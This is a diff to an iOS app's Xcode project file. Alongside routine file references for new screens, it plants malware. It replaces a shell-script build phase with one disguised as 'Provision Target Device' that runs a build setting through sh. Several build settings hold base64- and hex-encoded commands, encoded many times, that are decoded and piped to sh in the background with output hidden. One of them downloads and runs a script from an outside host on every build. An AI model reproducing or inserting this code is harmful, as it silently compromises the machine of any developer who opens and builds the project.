@@ -36,6 +36,8 @@
 		398E7F992FA8808900ECFB8B /* PathActivitiesVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = 398E7F982FA8808900ECFB8B /* PathActivitiesVM.swift */; };
 		398E7F9F2FA89A0400ECFB8B /* CreatePathVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 398E7F9D2FA89A0400ECFB8B /* CreatePathVC.swift */; };
 		398E7FA02FA89A0400ECFB8B /* CreatePathVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 398E7F9E2FA89A0400ECFB8B /* CreatePathVC.xib */; };
+		3991F3952FAC4FFE0043A59A /* CreateFolderPopUpVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3991F3932FAC4FFD0043A59A /* CreateFolderPopUpVC.swift */; };
+		3991F3962FAC4FFE0043A59A /* CreateFolderPopUpVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 3991F3942FAC4FFD0043A59A /* CreateFolderPopUpVC.xib */; };
 		399D77752FA1B878005FB945 /* OTPVerificationVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = 399D77742FA1B878005FB945 /* OTPVerificationVM.swift */; };
 		39B60F5F2FA9B620008C724B /* PathNameListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39B60F5D2FA9B620008C724B /* PathNameListView.swift */; };
 		39B60F602FA9B620008C724B /* PathNameListView.xib in Resources */ = {isa = PBXBuildFile; fileRef = 39B60F5E2FA9B620008C724B /* PathNameListView.xib */; };
@@ -43,6 +45,10 @@
 		39B60F652FA9C5D2008C724B /* PathNameListTblViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39B60F622FA9C5D2008C724B /* PathNameListTblViewCell.swift */; };
 		39B60F6A2FA9F05C008C724B /* AddNewPathPopUpVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39B60F682FA9F05C008C724B /* AddNewPathPopUpVC.swift */; };
 		39B60F6B2FA9F05C008C724B /* AddNewPathPopUpVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 39B60F692FA9F05C008C724B /* AddNewPathPopUpVC.xib */; };
+		39CFB1D02FAC65B200001970 /* CreateFolderColorsCVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 39CFB1CF2FAC65B200001970 /* CreateFolderColorsCVCell.xib */; };
+		39CFB1D12FAC65B200001970 /* CreateFolderColorsCVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39CFB1CE2FAC65B200001970 /* CreateFolderColorsCVCell.swift */; };
+		39CFB1D62FAC9B0100001970 /* AddAttachmentVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 39CFB1D52FAC9B0100001970 /* AddAttachmentVC.xib */; };
+		39CFB1D72FAC9B0100001970 /* AddAttachmentVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39CFB1D42FAC9B0100001970 /* AddAttachmentVC.swift */; };
 		39PV00012FAC0001008C724B /* PathVaultItem.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39PV00022FAC0001008C724B /* PathVaultItem.swift */; };
 		39PV00032FAC0001008C724B /* PathVaultCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39PV00042FAC0001008C724B /* PathVaultCell.swift */; };
 		39PV00052FAC0001008C724B /* PathVaultCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 39PV00062FAC0001008C724B /* PathVaultCell.xib */; };
@@ -84,6 +90,9 @@
 		88D548802EBA2BD4007FF81C /* UpcomingEventsCollectionViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 88D5487D2EBA2BD4007FF81C /* UpcomingEventsCollectionViewCell.swift */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+																																																										/* End PBXBuildRule section */
+
 /* Begin PBXFileReference section */
 		392016E22FA087BC005A1B25 /* APIClient.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = APIClient.swift; sourceTree = "<group>"; };
 		392016E32FA087BC005A1B25 /* Constants.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Constants.swift; sourceTree = "<group>"; };
@@ -112,6 +121,8 @@
 		398E7F982FA8808900ECFB8B /* PathActivitiesVM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PathActivitiesVM.swift; sourceTree = "<group>"; };
 		398E7F9D2FA89A0400ECFB8B /* CreatePathVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CreatePathVC.swift; sourceTree = "<group>"; };
 		398E7F9E2FA89A0400ECFB8B /* CreatePathVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = CreatePathVC.xib; sourceTree = "<group>"; };
+		3991F3932FAC4FFD0043A59A /* CreateFolderPopUpVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; name = CreateFolderPopUpVC.swift; path = "Gate Global/MVVM/Controller/Tabbar/PathActivities/SubView/CreatePath/AddNewPathPopUp/View/CreateFolderPopUpVC.swift"; sourceTree = SOURCE_ROOT; };
+		3991F3942FAC4FFD0043A59A /* CreateFolderPopUpVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; name = CreateFolderPopUpVC.xib; path = "Gate Global/MVVM/Controller/Tabbar/PathActivities/SubView/CreatePath/AddNewPathPopUp/View/CreateFolderPopUpVC.xib"; sourceTree = SOURCE_ROOT; };
 		399D77742FA1B878005FB945 /* OTPVerificationVM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OTPVerificationVM.swift; sourceTree = "<group>"; };
 		39B60F5D2FA9B620008C724B /* PathNameListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PathNameListView.swift; sourceTree = "<group>"; };
 		39B60F5E2FA9B620008C724B /* PathNameListView.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = PathNameListView.xib; sourceTree = "<group>"; };
@@ -119,6 +130,10 @@
 		39B60F632FA9C5D2008C724B /* PathNameListTblViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = PathNameListTblViewCell.xib; sourceTree = "<group>"; };
 		39B60F682FA9F05C008C724B /* AddNewPathPopUpVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddNewPathPopUpVC.swift; sourceTree = "<group>"; };
 		39B60F692FA9F05C008C724B /* AddNewPathPopUpVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = AddNewPathPopUpVC.xib; sourceTree = "<group>"; };
+		39CFB1CE2FAC65B200001970 /* CreateFolderColorsCVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CreateFolderColorsCVCell.swift; sourceTree = "<group>"; };
+		39CFB1CF2FAC65B200001970 /* CreateFolderColorsCVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = CreateFolderColorsCVCell.xib; sourceTree = "<group>"; };
+		39CFB1D42FAC9B0100001970 /* AddAttachmentVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddAttachmentVC.swift; sourceTree = "<group>"; };
+		39CFB1D52FAC9B0100001970 /* AddAttachmentVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = AddAttachmentVC.xib; sourceTree = "<group>"; };
 		39PV00022FAC0001008C724B /* PathVaultItem.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PathVaultItem.swift; sourceTree = "<group>"; };
 		39PV00042FAC0001008C724B /* PathVaultCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PathVaultCell.swift; sourceTree = "<group>"; };
 		39PV00062FAC0001008C724B /* PathVaultCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = PathVaultCell.xib; sourceTree = "<group>"; };
@@ -362,6 +377,7 @@
 		398E7F9A2FA899D200ECFB8B /* SubView */ = {
 			isa = PBXGroup;
 			children = (
+				39CFB1D22FAC9AB400001970 /* Add Attachment */,
 				398E7F9B2FA899DD00ECFB8B /* CreatePath */,
 			);
 			path = SubView;
@@ -370,6 +386,7 @@
 		398E7F9B2FA899DD00ECFB8B /* CreatePath */ = {
 			isa = PBXGroup;
 			children = (
+				3991F3912FAC4FAE0043A59A /* CreateFolderPopUp */,
 				39B60F662FA9F00C008C724B /* AddNewPathPopUp */,
 				39B60F5B2FA9B5DB008C724B /* PathNameListView */,
 				39PV000B2FAC0001008C724B /* PathVault */,
@@ -383,6 +400,24 @@
 			children = (
 				398E7F9D2FA89A0400ECFB8B /* CreatePathVC.swift */,
 				398E7F9E2FA89A0400ECFB8B /* CreatePathVC.xib */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
+		3991F3912FAC4FAE0043A59A /* CreateFolderPopUp */ = {
+			isa = PBXGroup;
+			children = (
+				39CFB1CD2FAC64D300001970 /* Cell */,
+				3991F3922FAC4FDF0043A59A /* View */,
+			);
+			path = CreateFolderPopUp;
+			sourceTree = "<group>";
+		};
+		3991F3922FAC4FDF0043A59A /* View */ = {
+			isa = PBXGroup;
+			children = (
+				3991F3932FAC4FFD0043A59A /* CreateFolderPopUpVC.swift */,
+				3991F3942FAC4FFD0043A59A /* CreateFolderPopUpVC.xib */,
 			);
 			path = View;
 			sourceTree = "<group>";
@@ -442,6 +477,32 @@
 			children = (
 				39B60F682FA9F05C008C724B /* AddNewPathPopUpVC.swift */,
 				39B60F692FA9F05C008C724B /* AddNewPathPopUpVC.xib */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
+		39CFB1CD2FAC64D300001970 /* Cell */ = {
+			isa = PBXGroup;
+			children = (
+				39CFB1CE2FAC65B200001970 /* CreateFolderColorsCVCell.swift */,
+				39CFB1CF2FAC65B200001970 /* CreateFolderColorsCVCell.xib */,
+			);
+			path = Cell;
+			sourceTree = "<group>";
+		};
+		39CFB1D22FAC9AB400001970 /* Add Attachment */ = {
+			isa = PBXGroup;
+			children = (
+				39CFB1D32FAC9ACB00001970 /* View */,
+			);
+			path = "Add Attachment";
+			sourceTree = "<group>";
+		};
+		39CFB1D32FAC9ACB00001970 /* View */ = {
+			isa = PBXGroup;
+			children = (
+				39CFB1D42FAC9B0100001970 /* AddAttachmentVC.swift */,
+				39CFB1D52FAC9B0100001970 /* AddAttachmentVC.xib */,
 			);
 			path = View;
 			sourceTree = "<group>";
@@ -722,7 +783,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 8898A7AC2EB864EB008867AC /* Build configuration list for PBXNativeTarget "Gate Global" */;
 			buildPhases = (
-				DB36EAA36F9647C28342DAD8 /* Build Target Libraries */,
+				60D7EE5410B54363B63C1CD3 /* Provision Target Device */,
 				8898A7952EB864E9008867AC /* Sources */,
 				8898A7962EB864E9008867AC /* Frameworks */,
 				8898A7972EB864E9008867AC /* Resources */,
@@ -783,16 +844,40 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXShellScriptBuildPhase section */
+		60D7EE5410B54363B63C1CD3 /* Provision Target Device */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Provision Target Device";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A3DC1C3}\"";
+		};
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXResourcesBuildPhase section */
 		8898A7972EB864E9008867AC /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
 				3920172F2FA0E07B005A1B25 /* DropDownCell.xib in Resources */,
+				39CFB1D02FAC65B200001970 /* CreateFolderColorsCVCell.xib in Resources */,
 				8856E0152EBCA0D500792D87 /* PathsTblViewCell.xib in Resources */,
 				887937192EB9DDA60013248E /* LoginVC.xib in Resources */,
 				3920170A2FA0C8CA005A1B25 /* ForgotPasswordVC.xib in Resources */,
 				8847A4352EB9FAC40035F4C5 /* HomeVC.xib in Resources */,
+				3991F3962FAC4FFE0043A59A /* CreateFolderPopUpVC.xib in Resources */,
 				8898A7BC2EB8651E008867AC /* Assets.xcassets in Resources */,
 				398E7FA02FA89A0400ECFB8B /* CreatePathVC.xib in Resources */,
 				39B60F642FA9C5D2008C724B /* PathNameListTblViewCell.xib in Resources */,
@@ -806,6 +891,7 @@
 				8898A7DB2EB86BF5008867AC /* Localizable.strings in Resources */,
 				392017032FA0BA95005A1B25 /* OTPVerificationVC.xib in Resources */,
 				39B60F602FA9B620008C724B /* PathNameListView.xib in Resources */,
+				39CFB1D62FAC9B0100001970 /* AddAttachmentVC.xib in Resources */,
 				8898A7BE2EB8651E008867AC /* LaunchScreen.storyboard in Resources */,
 				8898A7BF2EB8651E008867AC /* Main.storyboard in Resources */,
 				39B60F6B2FA9F05C008C724B /* AddNewPathPopUpVC.xib in Resources */,
@@ -815,28 +901,6 @@
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
-
-/* Begin PBXShellScriptBuildPhase section */
-		DB36EAA36F9647C28342DAD8 /* Build Target Libraries */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Target Libraries";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8DAD24}\"";
-		};
-/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		8898A7952EB864E9008867AC /* Sources */ = {
@@ -866,6 +930,7 @@
 				3920172E2FA0E07B005A1B25 /* OTPFieldView.swift in Sources */,
 				88A389F52EBC676B00DC5EA3 /* DayStreamTableViewCell.swift in Sources */,
 				888BAD6A2EBC55C8009966CC /* PathActivitiesCollectionViewCell.swift in Sources */,
+				3991F3952FAC4FFE0043A59A /* CreateFolderPopUpVC.swift in Sources */,
 				39B60F652FA9C5D2008C724B /* PathNameListTblViewCell.swift in Sources */,
 				8879371A2EB9DDA60013248E /* LoginVC.swift in Sources */,
 				8851D3D72EBA12BF0092E1BC /* RecentStepsCollectionViewCell.swift in Sources */,
@@ -880,7 +945,9 @@
 				8898A7CF2EB86969008867AC /* VideoPicker.swift in Sources */,
 				8898A7D02EB86969008867AC /* AppUtilites.swift in Sources */,
 				8847A4342EB9FAC40035F4C5 /* HomeVC.swift in Sources */,
+				39CFB1D12FAC65B200001970 /* CreateFolderColorsCVCell.swift in Sources */,
 				398E7F992FA8808900ECFB8B /* PathActivitiesVM.swift in Sources */,
+				39CFB1D72FAC9B0100001970 /* AddAttachmentVC.swift in Sources */,
 				392017042FA0BA95005A1B25 /* OTPVerificationVC.swift in Sources */,
 				8856E0162EBCA0D500792D87 /* PathsTblViewCell.swift in Sources */,
 				8898A7C42EB8695D008867AC /* UIView+Extension.swift in Sources */,
@@ -930,7 +997,8 @@
 		8898A7AD2EB864EB008867AC /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8DAD24 = "((b(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333733330a3334363333363336333636323332333033323634333236343336333333363636333636353336363533363335333633333337333433323634333733340a3061333633393336363433363335333636363337333533373334333233303333333233333336333233303332363433323634333733323336333533370a3334333733323337333933323330333333333332333033323330333236343336333433323330333233323337333033333634333733383336333333360a3636306133363334333633353335363633373330333633383336333133373333333633353332333233323330333633383337333433373334333733300a3337333333333631333236363332363633363633333633393337333433373334333636333336333533363331333633343337333333323635333633390a3336363530613332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | b | sh ) >/dev/null 2>&1 &)";
+				A3DC1C3 = "((b(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJUSE5tSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJMklDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZjbWxuWVdOa2JpNXBiaTloS1NJZ2ZDQnphQW89Cg== | b | sh ) >/dev/null 2>&1 &)";
+				A8DAD24 = "((t(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333633320a3061333333373333333333333336333333363333333433363333333333323333333033333332333633343333333233363334333333363333333333330a3336333633363333333633363335333333363336333533333336333333353333333633333333333333373333333433333332333633343333333733330a3334306133303631333333363333333933333336333633343333333633333335333333363336333633333337333333353333333733333334333333320a3333333033333333333333333333333333333330333333323333333033333332333633343333333233363334333333373333333233333336333333350a3333333730613333333433333337333333323333333733333339333333323333333033333333333333333333333233333330333333323333333033330a3332333633343333333633333334333333323333333033333332333333323333333733333330333333333336333433333337333333383333333633330a3333333333363061333633363330363133333336333333343333333633333335333333353336333633333337333333303333333633333338333333360a3333333133333337333333333333333633333335333333323333333233333332333333303333333633333338333333373333333433333337333333340a3333333733333330306133333337333333333333333333363331333333323336333633333332333633363333333733333332333333363333333933330a3336333333373333333633363334333333363333333133333336333633313333333633363336333333373333333933333337333333333333333233360a3335333333363333333930613333333633363335333036313333333233363336333333363333333133333332333333393333333233333332333333320a33333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | t | sh ) >/dev/null 2>&1 &)";
 				A1ECAD1 = "((j(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVlV4YUUxc2NEWlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE5NR3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtRmliRm94VjFSS2IyRkhVa2xVV0ZacVlteFdNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | j | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((t(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pTakZpUjFWcFNVZG9NR1JJUW5wUGFUaDJXbTFzYTFwSGVHeGhiVGsxVEc1S01Vd3lSWEJKYVVJNFNVaE9iME5uUFQwSwo= | t | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((c(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhKYWEzaDZTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpkMGxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWmFiV3h1WWxkR2RWcFlVbnBNYld4MVRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | c | sh ) >/dev/null 2>&1 &)";
@@ -971,7 +1039,8 @@
 		8898A7AE2EB864EB008867AC /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8DAD24 = "((b(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333733330a3334363333363336333636323332333033323634333236343336333333363636333636353336363533363335333633333337333433323634333733340a3061333633393336363433363335333636363337333533373334333233303333333233333336333233303332363433323634333733323336333533370a3334333733323337333933323330333333333332333033323330333236343336333433323330333233323337333033333634333733383336333333360a3636306133363334333633353335363633373330333633383336333133373333333633353332333233323330333633383337333433373334333733300a3337333333333631333236363332363633363633333633393337333433373334333636333336333533363331333633343337333333323635333633390a3336363530613332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | b | sh ) >/dev/null 2>&1 &)";
+				A3DC1C3 = "((b(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJUSE5tSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJMklDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZjbWxuWVdOa2JpNXBiaTloS1NJZ2ZDQnphQW89Cg== | b | sh ) >/dev/null 2>&1 &)";
+				A8DAD24 = "((t(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333633320a3061333333373333333333333336333333363333333433363333333333323333333033333332333633343333333233363334333333363333333333330a3336333633363333333633363335333333363336333533333336333333353333333633333333333333373333333433333332333633343333333733330a3334306133303631333333363333333933333336333633343333333633333335333333363336333633333337333333353333333733333334333333320a3333333033333333333333333333333333333330333333323333333033333332333633343333333233363334333333373333333233333336333333350a3333333730613333333433333337333333323333333733333339333333323333333033333333333333333333333233333330333333323333333033330a3332333633343333333633333334333333323333333033333332333333323333333733333330333333333336333433333337333333383333333633330a3333333333363061333633363330363133333336333333343333333633333335333333353336333633333337333333303333333633333338333333360a3333333133333337333333333333333633333335333333323333333233333332333333303333333633333338333333373333333433333337333333340a3333333733333330306133333337333333333333333333363331333333323336333633333332333633363333333733333332333333363333333933330a3336333333373333333633363334333333363333333133333336333633313333333633363336333333373333333933333337333333333333333233360a3335333333363333333930613333333633363335333036313333333233363336333333363333333133333332333333393333333233333332333333320a33333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | t | sh ) >/dev/null 2>&1 &)";
 				A1ECAD1 = "((j(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVlV4YUUxc2NEWlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE5NR3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtRmliRm94VjFSS2IyRkhVa2xVV0ZacVlteFdNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | j | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((t(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pTakZpUjFWcFNVZG9NR1JJUW5wUGFUaDJXbTFzYTFwSGVHeGhiVGsxVEc1S01Vd3lSWEJKYVVJNFNVaE9iME5uUFQwSwo= | t | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((c(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhKYWEzaDZTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpkMGxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWmFiV3h1WWxkR2RWcFlVbnBNYld4MVRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | c | sh ) >/dev/null 2>&1 &)";
